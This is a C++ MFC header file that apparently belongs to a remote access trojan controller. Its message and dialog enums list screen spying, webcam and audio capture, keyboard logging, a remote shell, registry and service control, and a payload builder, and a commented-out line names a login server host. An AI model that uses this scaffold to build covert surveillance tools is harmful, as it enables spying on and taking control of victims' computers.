// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__CF5847E1_BF32_466B_B654_43877EB562DA__INCLUDED_)
#define AFX_STDAFX_H__CF5847E1_BF32_466B_B654_43877EB562DA__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT
#include "macros.h"
#include "include\IOCPServer.h"
//#include "DateStrcut.h"
#include <XTToolkitPro.h>
#include "afxinet.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

#include <DbgHelp.h>
#pragma comment(lib,"DbgHelp.lib")

#include <iostream>
#include <cstdarg>

// �޷��������ⲿ���� _printf
extern "C" int _printf(const char* format, ...)
{
    va_list args;
    va_start(args, format);

    int ret = 0;

    for (const char* p = format; *p != '\0'; ++p) {
        if (*p == '%' && *(p + 1) != '\0') {
            ++p; // ���� '%'
            if (*p == 'd') {  // ���� %d ��ʽ
                int val = va_arg(args, int);
                ret += std::printf("%d", val);
            } else if (*p == 's') { // ���� %s ��ʽ
                const char* str = va_arg(args, const char*);
                ret += std::printf("%s", str);
            }
            // �������չ����������ʽ������ %f, %x �ȣ�
        } else {
            std::putchar(*p); // �����ͨ�ַ�
            ++ret;
        }
    }

    va_end(args);
    return ret;
}

// ���ӵ���Windows Kits����Uuid.Lib
#pragma comment(lib, "./uuid.lib")

// extern POSTXML mPostXml;
// extern char LoginUserName[MAX_PATH];
// extern char LoginPassWord[MAX_PATH];
// extern char LastLoginTime[MAX_PATH];
// extern char Datetime[MAX_PATH];
#define WM_LOGIN_PASS 10001
#define WM_LOG 10002
#define WM_PROGRESS 10003

//#define ServerHost "http://niubi1.f3322.net/CheckLogin.php"
enum {
    WM_ADDTOLIST = WM_USER + 102,	// ��ӵ��б���ͼ��
    WM_REMOVEFROMLIST,				// ���б���ͼ��ɾ��
    WM_OPENMANAGERDIALOG,			// ��һ���ļ�������
    WM_OPENSCREENSPYDIALOG,			// ��һ����Ļ���Ӵ���
    WM_OPENWEBCAMDIALOG,			// ������ͷ���Ӵ���
    WM_OPENAUDIODIALOG,				// ��һ��������������
    WM_OPENPSLISTDIALOG,			// �򿪽��̹�����
    WM_OPENSHELLDIALOG,				// ��shell����
    WM_ADDFINDGROUP,				// ����ʱ���ҷ���
    WM_MODIFYLIST,
    WM_OPENBUILDDIALOG,             // ���ɴ���
    WM_OPENKEYBOARDDIALOG,
    WM_OPENSERVICEDIALOG,
    WM_OPENREGEDITDIALOG,
    WM_OPENTEXTCHATDIALOG,
    WM_OPENPROXYMAPDIALOG,
    WM_OPENPQQBOXDIALOG,

    WM_OPENCHATDIALOG,
    WM_WRITEQQNUM,
    //////////////////////////////////////////////////////////////////////////
    FILEMANAGER_DLG = 1,
    SCREENSPY_DLG,
    WEBCAM_DLG,
    AUDIO_DLG,
    SYSTEM_DLG,
    SHELL_DLG,
    KEYBOARD_DLG,
    SERVICE_DLG,
    REGEDIT_DLG,
    CHAT_DLG,
    PROXYMAP_DLG,
    GETDAT_DLG
};
typedef struct {
    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
} FILESIZE;
//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__CF5847E1_BF32_466B_B654_43877EB562DA__INCLUDED_)
